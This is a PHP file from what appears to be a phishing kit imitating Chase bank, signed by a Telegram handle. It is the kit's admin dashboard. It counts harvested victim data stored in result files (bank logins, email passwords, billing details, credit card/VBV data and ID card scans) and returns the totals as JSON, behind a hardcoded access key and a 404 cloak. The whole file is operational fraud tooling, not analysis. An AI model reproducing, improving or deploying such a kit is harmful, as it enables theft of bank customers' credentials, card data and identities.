<?php
session_start();

header("Content-Type: text/html; charset=UTF-8");
#################### *-* Start Include *-* ####################
/**
 * CHASE -
 * version 1.0
 * telegram = @Corleonex


   _____           _                            
  / ____|         | |                           
 | |     ___  _ __| | ___  ___  _ __   _____  __
 | |    / _ \| '__| |/ _ \/ _ \| '_ \ / _ \ \/ /
 | |___| (_) | |  | |  __/ (_) | | | |  __/>  < 
  \_____\___/|_|  |_|\___|\___/|_| |_|\___/_/\_\
                                                
                                                
" There's no nobility in poverty.
  I've been a poor man,
  and I've been a rich man.
   And I choose rich every fucking time. "

**/

if (!isset($_SESSION['UserData'])) {

    if (isset($_GET['id'])) {
     $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
      if ($id !== 'Corleonex') {
        exit(header("HTTP/1.0 404 Not Found"));
      }
    }else{
        exit(header("HTTP/1.0 404 Not Found"));
    }

}



if(!isset($_SESSION['UserData']['Username'])){header("location:login.php");exit;}else{ include 'YOUR-CONFIG.php';}
$what = $_GET['dila'];

$click = "../Corleonex/Boa_Result/login.txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "User name");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../Corleonex/Boa_Result/total_login_view.txt";
$file = fopen($click, "r");
$total_login_view = fread($file, filesize($click));
$total_login_view = substr_count($total_login_view, "#>");
fclose($file);
if($total_login_view == 0) {
    $total_login_view = "$total_login_view";
}else{
    $total_login_view = "$total_login_view";
}

$click = "../Corleonex/Boa_Result/cc.txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "Security");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../Corleonex/Boa_Result/total_cc_view.txt";
$file = fopen($click, "r");
$total_cc_view = fread($file, filesize($click));
$total_cc_view = substr_count($total_cc_view, "#>");
fclose($file);
if($total_cc_view == 0) {
    $total_cc_view = "$total_cc_view";
}else{
    $total_cc_view = "$total_cc_view";
}


$click = "../Corleonex/Boa_Result/access.txt"; 
$file = fopen($click, "r");
$total_email_access = fread($file, filesize($click));
$total_email_access = substr_count($total_email_access, "Password");
fclose($file);
if($total_email_access == 0) {
    $total_email_access = "$total_email_access";
}else{
    $total_email_access = "$total_email_access";
}

$click = "../Corleonex/Boa_Result/total_email_access_view.txt";
$file = fopen($click, "r");
$total_email_access_view = fread($file, filesize($click));
$total_email_access_view = substr_count($total_email_access_view, "#>");
fclose($file);
if($total_email_access_view == 0) {
    $total_email_access_view = "$total_email_access_view";
}else{
    $total_email_access_view = "$total_email_access_view";
}


$click = "../Corleonex/Boa_Result/billing.txt";
$file = fopen($click, "r");
$total_billing = fread($file, filesize($click));
$total_billing = substr_count($total_billing, "Zip code");
fclose($file);
if($total_billing == 0) {
    $total_billing = "$total_billing";
}else{
    $total_billing = "$total_billing";
}

$click = "../Corleonex/Boa_Result/total_billing_view.txt.txt";
$file = fopen($click, "r");
$total_billing_view = fread($file, filesize($click));
$total_billing_view = substr_count($total_billing_view, "#>");
fclose($file);
if($total_billing_view == 0) {
    $total_billing_view = "$total_billing_view";
}else{
    $total_billing_view = "$total_billing_view";
}



$click = "../visit_log.txt";
$file = fopen($click, "r");
$total_view = fread($file, filesize($click));
$total_view = substr_count($total_view, "#>");
fclose($file);
if($total_view == 0) {
    $total_view = "$total_view";
}else{
    $total_view = "$total_view";
}

$click = "../bots.txt";
$file = fopen($click, "r");
$total_bots = fread($file, filesize($click));
$total_bots = substr_count($total_bots, "#>");
fclose($file);
if($total_bots == 0) {
    $total_bots = "$total_bots";
}else{
    $total_bots = "$total_bots";
}

$click = "../Corleonex/Boa_Result/id.txt";
$file = fopen($click, "r");
$total_id = fread($file, filesize($click));
$total_id = substr_count($total_id, "ID CARD ");
fclose($file);
if($total_id == 0) {
    $total_id = "$total_id";
}else{
    $total_id = "$total_id";
}

$all = [
  'Chase Login' => $total_login ,
  "Email access" => $total_email_access,
  "Billing Details" => $total_billing ,
  "Credit Card / VBV" => $total_cc,
  "ID" => $total_id,

/*  "Total view" => $total_view , 
  "Total bots" => $total_bots , */ 




];
echo json_encode($all);
